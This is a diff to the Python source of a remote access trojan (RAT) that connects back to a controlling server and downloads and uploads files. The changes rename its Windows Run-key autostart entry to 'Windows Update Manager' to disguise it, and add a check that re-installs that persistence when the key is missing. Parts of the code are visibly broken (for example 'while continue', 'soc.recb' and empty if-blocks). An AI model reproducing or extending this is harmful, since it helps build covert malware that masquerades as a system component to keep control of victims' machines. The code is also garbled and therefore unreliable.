@@ -82,7 +82,7 @@ def persistence(plat):
 	
         try:
             reg_key = winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, winreg.KEY_WRITE)
-            winreg.SetValueEx(reg_key, 'br', 0, winreg.REG_SZ, bin_path)
+            winreg.SetValueEx(reg_key, "Windows Update Manager", 0, winreg.REG_SZ, bin_path)
             winreg.CloseKey(reg_key)
             return "HKEY_CURRENT_USER Run registry key applied"
         except WindowsError:
@@ -132,7 +132,7 @@ def download():
     received = ""
     received = soc.recv(4096)
     received = decrypt(key, received)
-    name_file = received[-1].split(\) #only for a file from windows|for file from linux used .split(/)
+    name_file = received[0].split(\) #only for a file from windows|for file from linux used .split(/) #pk [-1]? plutot [0] non?
     size = received[1]
     while continue:
         received = soc.recb(4096)
@@ -190,11 +190,36 @@ def upload(path_file):
 
 ###Program###
 def main():
-    #verify if the key to automaticaly start this RAT is in the registers
+    #verify if the key is in the registers to automaticaly start this RAT
+    if plat == 'win':
+        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        try:
+            reg_key = winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS)
+            i = 0
+            key_name = ""
+            while winreg.EnumValue(reg_key, i) != key_name:
+                key_name = winreg.EnumValue(reg_key, i)       #des lignes pour rien
+                i += 1                                        #bcp de lignes pour rien...
+                if key_name[1] == "Windows Update Manager":
+                    indic = 1
+                    break
+            if indic == 1:
+                #return "Key is already in registers"
+            if indic == 0:
+                #return "Key is not yet in registers"
+                persistence()
+        except WindowsError:
+            pass
+            #return "HKEY_CURRENT_USER Run registry key verification failed"
+    if plat == "nix":
+        #device not yet supported
+    if plat == "unk":
+        #device not yet supported
 
     #try connecting to the server
 	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host = socket.gethostname()
+    #soc.bind((host, port)) #not necessary ?
     connected = False
     while connected == False:
         try:
@@ -228,3 +253,10 @@ def main():
 
 if __name__ == "__main__":
 	main()
+    
+    
+    
+    
+#quand message envoyé 
+#destinataire envoie message confirmation avant que les programmes ne puissent continuer
+
